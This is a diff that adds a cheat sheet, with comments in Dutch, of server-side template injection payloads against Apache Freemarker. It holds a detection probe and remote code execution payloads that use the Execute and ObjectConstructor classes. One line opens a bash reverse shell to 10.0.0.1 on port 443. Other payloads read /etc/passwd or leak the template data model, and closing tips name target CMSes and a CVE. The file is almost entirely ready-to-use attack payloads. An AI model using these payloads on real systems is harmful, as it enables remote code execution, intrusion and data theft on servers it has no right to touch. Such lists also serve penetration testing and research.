@@ -1,0 +1,17 @@
+# SSTI - Apache Freemarker (Java) RCE
+# Detectie: ${7*7} -> 49, ${7*"7"} -> ERROR (Java type mismatch)
+# === RCE via Execute class ===
+${"freemarker.template.utility.Execute"?new()("id")}
+${"freemarker.template.utility.Execute"?new()("whoami")}
+# Reverse shell:
+${"freemarker.template.utility.Execute"?new()("bash -c 'bash -i >& /dev/tcp/10.0.0.1/443 0>&1'")}
+# === RCE via ObjectConstructor ===
+${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder",["id"])}
+# === File lezen ===
+${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve("/etc/passwd").toURL().openStream().readAllBytes()?join(" ")}
+# === Informatie lekken ===
+${.version}
+${.data_model}
+# Tip: Freemarker wordt veel gebruikt in Java CMS (Halo, Liferay)
+# Tip: ?new() built-in is de sleutel voor RCE
+# Tip: CVE-2020-21523 (Halo CMS) = authenticated Freemarker SSTI
